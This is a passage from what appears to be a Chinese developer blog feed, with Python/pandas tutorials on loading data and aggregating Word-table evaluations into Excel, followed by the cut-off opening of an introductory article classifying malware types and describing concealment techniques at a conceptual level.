class="line">df</span><br></pre></td></tr></table></figure><p>输出：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220122/excel%E5%8A%A0%E8%BD%BD%E6%95%B0%E6%8D%AE.png" alt="通过csv加载"></p><h1 id="二、读取EXCEL文件"><a href="#二、读取EXCEL文件" class="headerlink" title="二、读取EXCEL文件"></a>二、读取EXCEL文件</h1><p>Excel 是由微软公司开发的办公软件之一，它在日常工作中得到了广泛的应用。在数据量较少的情况下，Excel 对于数据的处理、分析、可视化有其独特的优势，因此可以显著提升您的工作效率。但是，当数据量非常大时，Excel 的劣势就暴露出来了，比如，操作重复、数据分析难等问题。Pandas 提供了操作 Excel 文件的函数，可以很方便地处理 Excel 表格。<br>pandas提供了 read_excel() 方法，从 Excel文件中读取数据，并创建 DataFrame 对象。<br>staff数据集excel文件staff.xlsx如下图：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220122/staff_excel.png" alt="staff.xlsx"><br>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">df = pd.read_excel(<span class="string">'C:\\Users\\xiejava\\Desktop\\staff.xlsx'</span>)</span><br><span class="line">df</span><br></pre></td></tr></table></figure><p>输出：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220122/%E5%8A%A0%E8%BD%BDcsv.png" alt="通过Excel加载数据"></p><h1 id="三、读取MySQL数据库表"><a href="#三、读取MySQL数据库表" class="headerlink" title="三、读取MySQL数据库表"></a>三、读取MySQL数据库表</h1><p>在许多应用中，数据很少取自文本文件，因为这种方式存储数据量有限且比较低效。最常见的是基于SQL的关系型数据库如MySQL、MS-SQL、PostgreSQL等。pandas将关系型数据库加载到DataFrame的过程很简单，通过read_sql_query()方法就可以快速的将数据加载。<br>同样是staff的数据集，在mysql中的表结构如下：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`staff`</span> (</span><br><span class="line">  <span class="string">`staff_id`</span> <span class="built_in">int</span>(<span class="number">11</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`staff_name`</span> <span class="built_in">varchar</span>(<span class="number">64</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`staff_age`</span> <span class="built_in">int</span>(<span class="number">2</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'年龄'</span>,</span><br><span class="line">  <span class="string">`staff_gender`</span> <span class="built_in">varchar</span>(<span class="number">2</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'性别'</span>,</span><br><span class="line">  <span class="string">`staff_salary`</span> <span class="keyword">double</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'薪水'</span>,</span><br><span class="line">  <span class="string">`staff_depatment_id`</span> <span class="built_in">int</span>(<span class="number">2</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span> <span class="keyword">COMMENT</span> <span class="string">'部门ID'</span></span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure><p>数据如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220122/staff_mysql.png" alt="staff数据集MySQL记录"><br>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> sqlalchemy <span class="keyword">import</span> create_engine</span><br><span class="line">engine = create_engine(<span class="string">'mysql+pymysql://root:yourpassword@localhost:3306/pandastest'</span>)</span><br><span class="line">sql_query_staff = <span class="string">'select * from staff;'</span></span><br><span class="line">df_staff = pd.read_sql_query(sql_query_staff, engine)</span><br><span class="line">df_staff</span><br></pre></td></tr></table></figure><p>输出：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220122/%E5%8A%A0%E8%BD%BDMySQL%E6%95%B0%E6%8D%AE.png" alt="加载mysql数据"></p><h1 id="四、读取Web-API的数据"><a href="#四、读取Web-API的数据" class="headerlink" title="四、读取Web API的数据"></a>四、读取Web API的数据</h1><p>除了本地文件和数据库外，许多网站和web应用都有一些通过JSON或其他格式提供数据的公共API。可以通过Python的requests包来访问这些API获得相应的数据，经过解析处理后加载到pandas的DataFrame中。<br>为了演示方便，本文通过Flask做了一个staff数据集的API，效果如下：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220122/staff_webapi.png" alt="staff数据集API"><br>通过requests包来访问API，通过json包来解析json，然后加载到pandas的DataFrame中。<br>代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line">url=<span class="string">'http://127.0.0.1:5000/getstaff'</span></span><br><span class="line">resp=requests.get(url)</span><br><span class="line">data=json.loads(resp.text)</span><br><span class="line">staff=pd.DataFrame(data)</span><br><span class="line">staff</span><br></pre></td></tr></table></figure><p>输出：<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220122/%E5%8A%A0%E8%BD%BDwebAPI%E6%95%B0%E6%8D%AE.png" alt="加载WEBAPI数据"></p><p>至此，通过staff测试数据集介绍了pandas的常用多种类型数据源的加载，包括csv、excel、mysql、web API。可以看出pandas对于数据加载非常的方便高效。</p><p>全部数据集及源代码：<a href="https://github.com/xiejava1018/pandastest.git" target="_blank" rel="noopener">https://github.com/xiejava1018/pandastest.git</a></p><hr><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python实现读取Word表格计算汇总写入Excel</title>
      <link href="/posts/14434407/"/>
      <url>/posts/14434407/</url>
      
        <content type="html"><![CDATA[<p>快过年了，又到了公司年底评级的时候了。今年的评级和往常一下，每个人都要填写公司的民主评议表，给各个同事进行评价打分，然后部门收集起来根据收集上来的评价表进行汇总统计。想想要收集几十号人的评价表，并根据每个人的评价表又要填到Excel中进行汇总计算统计给出每个人的评价，就头大。虽然不是个什么难事，但是是个无脑的细致活。几十个人的评价也得要花大半天的时间来弄，而且搞多了还容易搞错。如是就想起干脆用Python写个小程序自动来处理这些脏活累活，评级年年都要评，每年都可以用。</p><p>要做的事情就是读放到某个文件夹中的word文档中的评价表格，根据表格内容进行处理，然后汇总所有的表格数据，根据计算规则，算出每个人的评分，在根据评分计算每个人的评价。汇总后写入Excel中。<br><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/2022/20220120/word2excle.png" alt="处理Word解析、汇总、统计写入Excel"></p><p>不可否认用Python来实现这样的事情真的是太方便了，人生苦短我用Python。<br>我是用的python的docx包来处理word，用pandas来处理数据并写入excel</p><h1 id="一、首先导入包"><a href="#一、首先导入包" class="headerlink" title="一、首先导入包"></a>一、首先导入包</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install docx</span><br><span class="line">pip install pandas</span><br></pre></td></tr></table></figure><p>pandas写excel依赖openpyxl包所以也到导入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install openpyxl</span><br></pre></td></tr></table></figure><h1 id="二、读评价表所在的目录文件"><a href="#二、读评价表所在的目录文件" class="headerlink" title="二、读评价表所在的目录文件"></a>二、读评价表所在的目录文件</h1><p>通过python的os包，列出文件夹里面的文件，识别出.docx的文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">files=os.listdir(filepah)</span><br><span class="line"><span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">    <span class="keyword">if</span> file.find(<span class="string">'.docx'</span>)&gt;<span class="number">0</span>:</span><br><span class="line">        docfilepah=filepah+file</span><br></pre></td></tr></table></figure><h1 id="三、读word文件，处理word中的表格数据"><a href="#三、读word文件，处理word中的表格数据" class="headerlink" title="三、读word文件，处理word中的表格数据"></a>三、读word文件，处理word中的表格数据</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">data=[]</span><br><span class="line"><span class="comment">#读word的docx评议表文件，并读取word中的表格数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">procdoc</span><span class="params">(docfilepath)</span>:</span></span><br><span class="line">    document=Document(docfilepath)</span><br><span class="line">    tables=document.tables</span><br><span class="line">    table=tables[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(table.rows)):</span><br><span class="line">        id=int(table.cell(i,<span class="number">0</span>).text)</span><br><span class="line">        name=table.cell(i,<span class="number">1</span>).text</span><br><span class="line">        excellent=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> table.cell(i,<span class="number">2</span>).text!=<span class="string">''</span> <span class="keyword">and</span> table.cell(i,<span class="number">2</span>).text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            excellent=<span class="number">1</span></span><br><span class="line">        competent = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> table.cell(i, <span class="number">3</span>).text!=<span class="string">''</span> <span class="keyword">and</span> table.cell(i, <span class="number">3</span>).text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            competent=<span class="number">1</span></span><br><span class="line">        basicacompetent=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> table.cell(i, <span class="number">4</span>).text!=<span class="string">''</span> <span class="keyword">and</span> table.cell(i, <span class="number">4</span>).text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            basicacompetent=<span class="number">1</span></span><br><span class="line">        notcompetent = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> table.cell(i, <span class="number">5</span>).text!=<span class="string">''</span> <span class="keyword">and</span> table.cell(i, <span class="number">5</span>).text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            notcompetent=<span class="number">1</span></span><br><span class="line">        dontunderstand =<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> table.cell(i, <span class="number">6</span>).text!=<span class="string">''</span> <span class="keyword">and</span> table.cell(i, <span class="number">6</span>).text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            dontunderstand=<span class="number">1</span></span><br><span class="line">        appraisedata=[id,name,excellent,competent,basicacompetent,notcompetent,dontunderstand]</span><br><span class="line">        data.append(appraisedata)</span><br></pre></td></tr></table></figure><h1 id="四、统计计算"><a href="#四、统计计算" class="headerlink" title="四、统计计算"></a>四、统计计算</h1><p>通过pandas直接对数据进行统计计算，避免了传统的循环计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(data,columns=[<span class="string">'序号'</span>,<span class="string">'姓名'</span>,<span class="string">'优秀'</span>,<span class="string">'称职'</span>,<span class="string">'基本称职'</span>,<span class="string">'不称职'</span>,<span class="string">'不了解'</span>])</span><br><span class="line">df=df.groupby([<span class="string">'序号'</span>,<span class="string">'姓名'</span>]).sum() <span class="comment">#汇总每个人每一项的评分</span></span><br><span class="line">df[<span class="string">'票数'</span>] = df.apply(<span class="keyword">lambda</span> x: x.sum(), axis=<span class="number">1</span>) <span class="comment">#统计票数</span></span><br><span class="line">df[<span class="string">'计分'</span>] = (df[<span class="string">'优秀'</span>]*<span class="number">95</span>+df[<span class="string">'称职'</span>]*<span class="number">85</span>+df[<span class="string">'基本称职'</span>]*<span class="number">75</span>+df[<span class="string">'不称职'</span>]*<span class="number">65</span>+df[<span class="string">'不了解'</span>]*<span class="number">0</span>)/len(df)<span class="comment">#根据规则计分</span></span><br><span class="line">df[<span class="string">'评价'</span>]=df[<span class="string">'计分'</span>].map(getscore) <span class="comment">#根据规则评价评级</span></span><br></pre></td></tr></table></figure><p>计分方法：民主评议得分=Σ各等级票数*等级计分分数/总票数，其中“优秀”计95分，“称职”计85分，“基本称职”计75分，“不称职”计65分，“不了解”不计分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#根据评分规则计算评级</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getscore</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x&gt;=<span class="number">95</span>:</span><br><span class="line">        score=<span class="string">'优秀'</span></span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">80</span> <span class="keyword">and</span> x&lt;<span class="number">95</span>:</span><br><span class="line">        score=<span class="string">'称职'</span></span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">75</span> <span class="keyword">and</span> x&lt;<span class="number">80</span>:</span><br><span class="line">        score=<span class="string">'基本称职'</span></span><br><span class="line">    <span class="keyword">elif</span> x&lt;<span class="number">75</span>:</span><br><span class="line">        score=<span class="string">'不称职'</span></span><br><span class="line">    <span class="keyword">return</span> score</span><br></pre></td></tr></table></figure><h1 id="五、将统计计算结果写入汇总Excel"><a href="#五、将统计计算结果写入汇总Excel" class="headerlink" title="五、将统计计算结果写入汇总Excel"></a>五、将统计计算结果写入汇总Excel</h1><p>通过pandas直接可以将dataframe写入到Excel文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#将汇总计算好的数据写入Excel</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write2excle</span><span class="params">(exclefile,dataframe)</span>:</span></span><br><span class="line">    writer = pd.ExcelWriter(exclefile)</span><br><span class="line">    dataframe.to_excel(writer)</span><br><span class="line">    writer.save()</span><br><span class="line">    print(<span class="string">'输出成功'</span>)</span><br></pre></td></tr></table></figure><h1 id="完整代码"><a href="#完整代码" class="headerlink" title="完整代码"></a>完整代码</h1><p><strong>Python不到八十行代码，实现读Word-&gt;处理表格数据-&gt;汇总计算数据-&gt;写Excel。</strong><br>完整的代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pandas <span class="keyword">as</span> pd</span><br><span class="line"><span class="keyword">from</span> docx <span class="keyword">import</span> Document</span><br><span class="line"></span><br><span class="line">data=[]</span><br><span class="line"><span class="comment">#读word的docx评议表文件，并读取word中的表格数据</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">procdoc</span><span class="params">(docfilepath)</span>:</span></span><br><span class="line">    document=Document(docfilepath)</span><br><span class="line">    tables=document.tables</span><br><span class="line">    table=tables[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,len(table.rows)):</span><br><span class="line">        id=int(table.cell(i,<span class="number">0</span>).text)</span><br><span class="line">        name=table.cell(i,<span class="number">1</span>).text</span><br><span class="line">        excellent=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> table.cell(i,<span class="number">2</span>).text!=<span class="string">''</span> <span class="keyword">and</span> table.cell(i,<span class="number">2</span>).text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            excellent=<span class="number">1</span></span><br><span class="line">        competent = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> table.cell(i, <span class="number">3</span>).text!=<span class="string">''</span> <span class="keyword">and</span> table.cell(i, <span class="number">3</span>).text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            competent=<span class="number">1</span></span><br><span class="line">        basicacompetent=<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> table.cell(i, <span class="number">4</span>).text!=<span class="string">''</span> <span class="keyword">and</span> table.cell(i, <span class="number">4</span>).text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            basicacompetent=<span class="number">1</span></span><br><span class="line">        notcompetent = <span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> table.cell(i, <span class="number">5</span>).text!=<span class="string">''</span> <span class="keyword">and</span> table.cell(i, <span class="number">5</span>).text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            notcompetent=<span class="number">1</span></span><br><span class="line">        dontunderstand =<span class="number">0</span></span><br><span class="line">        <span class="keyword">if</span> table.cell(i, <span class="number">6</span>).text!=<span class="string">''</span> <span class="keyword">and</span> table.cell(i, <span class="number">6</span>).text <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">            dontunderstand=<span class="number">1</span></span><br><span class="line">        appraisedata=[id,name,excellent,competent,basicacompetent,notcompetent,dontunderstand]</span><br><span class="line">        data.append(appraisedata)</span><br><span class="line"></span><br><span class="line"><span class="comment">#读取评议表的目录，并处理目录中的docx文件，根据评议表计算评分，写入汇总表。</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">readfile</span><span class="params">(filepah)</span>:</span></span><br><span class="line">    files=os.listdir(filepah)</span><br><span class="line">    <span class="keyword">for</span> file <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> file.find(<span class="string">'.docx'</span>)&gt;<span class="number">0</span>:</span><br><span class="line">            docfilepah=filepah+file</span><br><span class="line">            procdoc(docfilepah)</span><br><span class="line">    df = pd.DataFrame(data,columns=[<span class="string">'序号'</span>,<span class="string">'姓名'</span>,<span class="string">'优秀'</span>,<span class="string">'称职'</span>,<span class="string">'基本称职'</span>,<span class="string">'不称职'</span>,<span class="string">'不了解'</span>])</span><br><span class="line">    print(df)</span><br><span class="line">    df=df.groupby([<span class="string">'序号'</span>,<span class="string">'姓名'</span>]).sum()</span><br><span class="line">    df[<span class="string">'票数'</span>] = df.apply(<span class="keyword">lambda</span> x: x.sum(), axis=<span class="number">1</span>)</span><br><span class="line">    df[<span class="string">'计分'</span>] = (df[<span class="string">'优秀'</span>]*<span class="number">95</span>+df[<span class="string">'称职'</span>]*<span class="number">85</span>+df[<span class="string">'基本称职'</span>]*<span class="number">75</span>+df[<span class="string">'不称职'</span>]*<span class="number">65</span>+df[<span class="string">'不了解'</span>]*<span class="number">0</span>)/len(df)</span><br><span class="line">    df[<span class="string">'评价'</span>]=df[<span class="string">'计分'</span>].map(getscore)</span><br><span class="line">    print(df)</span><br><span class="line">    write2excle(<span class="string">'民主评议\\民主评议表汇总.xlsx'</span>,df)</span><br><span class="line"></span><br><span class="line"><span class="comment">#根据评分规则计算评级</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getscore</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> x&gt;=<span class="number">95</span>:</span><br><span class="line">        score=<span class="string">'优秀'</span></span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">80</span> <span class="keyword">and</span> x&lt;<span class="number">95</span>:</span><br><span class="line">        score=<span class="string">'称职'</span></span><br><span class="line">    <span class="keyword">elif</span> x&gt;=<span class="number">75</span> <span class="keyword">and</span> x&lt;<span class="number">80</span>:</span><br><span class="line">        score=<span class="string">'基本称职'</span></span><br><span class="line">    <span class="keyword">elif</span> x&lt;<span class="number">75</span>:</span><br><span class="line">        score=<span class="string">'不称职'</span></span><br><span class="line">    <span class="keyword">return</span> score</span><br><span class="line"></span><br><span class="line"><span class="comment">#将汇总计算好的数据写入Excel</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write2excle</span><span class="params">(exclefile,dataframe)</span>:</span></span><br><span class="line">    writer = pd.ExcelWriter(exclefile)</span><br><span class="line">    dataframe.to_excel(writer)</span><br><span class="line">    writer.save()</span><br><span class="line">    print(<span class="string">'输出成功'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    readfile(<span class="string">'民主评议\\'</span>)</span><br></pre></td></tr></table></figure><p>全部源代码：<a href="https://github.com/xiejava1018/pythonprocword" target="_blank" rel="noopener">https://github.com/xiejava1018/pythonprocword</a></p><p>作者博客：<a href="http://xiejava.ishareread.com/" target="_blank" rel="noopener">http://xiejava.ishareread.com/</a></p><center> <br><p><img src="https://xiejava1018.github.io/xiejavaimagesrc/images/fullbug%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7.jpg" alt="“fullbug”微信公众号" title="“fullbug”微信公众号"> </p><p>关注：微信公众号,一起学习成长！</center></p>]]></content>
      
      
      <categories>
          
          <category> 技术 </category>
          
          <category> 开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全之恶意代码</title>
      <link href="/posts/72d6b06f/"/>
      <url>/posts/72d6b06f/</url>
      
        <content type="html"><![CDATA[<p>恶意代码是一种有害的计算机代码或 web 脚本，其设计目的是创建系统漏洞，并借以造成后门、安全隐患、信息和数据盗窃、以及其他对文件和计算机系统的潜在破坏。恶意代码不仅使企业和用户蒙受了巨大的经济损失，而且使国家的安全面临着严重威胁。1991年的海湾战争是美国第一次公开在实战中使用恶意代码攻击技术取得重大军事利益，从此恶意代码攻击成为信息战、网络战最重要的入侵手段之一。恶意代码问题无论从政治上、经济上、还是军事上，都成为信息安全面临的首要问题。让我们一起来认识一下恶意代码。</p><h1 id="一、什么是恶意代码"><a href="#一、什么是恶意代码" class="headerlink" title="一、什么是恶意代码"></a>一、什么是恶意代码</h1><p>恶意代码（Unwanted Code）是指故意编制或设置的、对网络或系统会产生威胁或潜在威胁的计算机代码。最常见的恶意代码有计算机病毒（简称病毒）、特洛伊木马（简称木马）、计算机蠕虫（简称蠕虫）、后门、逻辑炸弹等。</p><h1 id="二、恶意代码的分类"><a href="#二、恶意代码的分类" class="headerlink" title="二、恶意代码的分类"></a>二、恶意代码的分类</h1><h2 id="1、恶意代码分类"><a href="#1、恶意代码分类" class="headerlink" title="1、恶意代码分类"></a>1、恶意代码分类</h2><p>恶意代码的分类标准主要是代码的<strong>独立性</strong>和<strong>自我复制性</strong>，独立的恶意代码是指具备一个完整程序所应该具有的全部功能功能，能够独立传播、运行的恶意代码，这样的恶意代码不需要寄宿在另一个程序中。非独立恶意代码只是一段代码，必须嵌入某个完整的程序中，作为该程序的一个组成部分进行传播和运行。对于非独立恶意代码，自我复制过程就是将自身嵌入宿主程序的过程，这个过程也称为感染宿主程序的过程。对于独立恶意代码，自我复制过程就是将自身传播给其他系统的过程。不具有自我复制能力的恶意代码必须借助其他媒介进行传播。</p><p>分类：</p><table><thead><tr><th>类别</th><th>实例</th></tr></thead><tbody><tr><td>具有自我复制能力的依附性恶意代码</td><td>主要代表是病毒</td></tr><tr><td>具有自我复制能力的独立性恶意代码</td><td>主要代表是蠕虫</td></tr><tr><td>不具有自我复制能力的依附性恶意代码</td><td>主要代表是后门</td></tr><tr><td>不具有自我复制能力的独立性恶意代码</td><td>主要代表是木马</td></tr></tbody></table><h2 id="2、不同恶意代码的区别"><a href="#2、不同恶意代码的区别" class="headerlink" title="2、不同恶意代码的区别"></a>2、不同恶意代码的区别</h2><p>病毒侧重于破坏系统和程序的能力</p><p>木马侧重于窃取敏感信息的能力</p><p>蠕虫侧重于网络中的自我复制能力和自我传染能力</p><table><thead><tr><th></th><th>病毒</th><th>木马</th><th>蠕虫</th></tr></thead><tbody><tr><td><strong>存在形式</strong></td><td>寄生</td><td>独立文件</td><td>独立文件</td></tr><tr><td><strong>传染途径</strong></td><td>通过宿主程序运行</td><td>植入目标主机</td><td>系统漏洞</td></tr><tr><td><strong>传染速度</strong></td><td>慢</td><td>最慢</td><td>快</td></tr><tr><td><strong>攻击目标</strong></td><td>本地文件</td><td>文件、网络主机</td><td>存在漏洞的网络程序</td></tr><tr><td><strong>触发机制</strong></td><td>攻击者指定条件</td><td>自启动</td><td>自动攻击有漏洞的程序</td></tr><tr><td><strong>防范方法</strong></td><td>从宿主文件中清除</td><td>清除启动项和木马服务程序</td><td>更新安全补丁</td></tr><tr><td><strong>对抗主体</strong></td><td>用户，反病毒软件</td><td>用户、管理员、反病毒软件</td><td>应用程序供应商、用户和管理员</td></tr></tbody></table><h1 id="三、恶意代码基本技术"><a href="#三、恶意代码基本技术" class="headerlink" title="三、恶意代码基本技术"></a>三、恶意代码基本技术</h1><h2 id="1、隐蔽技术"><a href="#1、隐蔽技术" class="headerlink" title="1、隐蔽技术"></a>1、隐蔽技术</h2><h3 id="（1）本地隐藏"><a href="#（1）本地隐藏" class="headerlink" title="（1）本地隐藏"></a>（1）本地隐藏</h3><p> 防止本地系统管理人员觉察而采取的隐蔽手段。</p><ul><li><strong>文件隐蔽</strong>：将恶意代码的文件命名为与系统的合法程序文件名相似的名称，或者干脆取而代之，或者将恶意代码文件附加到合法程序文件中。</li><li><strong>进程隐蔽</strong>：附着或替换系统进程，使恶意代码以合法服务的身份运行，从而隐蔽恶意代码。还可以通过修改进程列表程序，修改命令行参数使恶意代码进程的信息无法查询。也可以借助RootKit 技术实现进程隐蔽。</li><li><strong>网络连接隐蔽</strong>：借用现有服务的端口实现网络连接隐蔽，如使用80端口，攻击者在自己的数据包设置特殊标识，通过标识识别连接信息，未标识的WWW 